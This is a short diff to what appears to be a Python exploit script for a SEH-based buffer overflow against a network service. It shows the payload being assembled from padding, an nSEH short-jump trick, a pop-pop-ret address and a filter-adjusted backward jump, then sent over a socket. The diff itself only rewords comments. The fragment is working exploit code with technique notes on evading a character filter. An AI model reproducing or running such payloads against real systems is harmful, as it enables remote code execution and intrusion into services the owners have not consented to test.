@@ -22,8 +22,8 @@ buffer+="C"*40
 buffer+="\x71\x06\x70\x04" #nSEH
 #Instructions: JNO 06 JO 04. Actual flag position doesn't matter, since the jump will be taken either way
 buffer+="\x5E\x19\x50\x62" #pop pop ret
-buffer+="\x71\xFF" #Jump 128 bytes backwards, overflow flag isn't set at this point, filter translated to 7180 (JNO -128)
-buffer+="C"*1474 #Where we put our jump to offset
+buffer+="\x71\xFF" #Jump 128 bytes backwards, overflow flag isn't set at this point, filter translated to \x71\x80 (JNO -128)
+buffer+="C"*1474 #Only a few bytes of this space are usable.
 
 s.send(buffer)
 s.close()
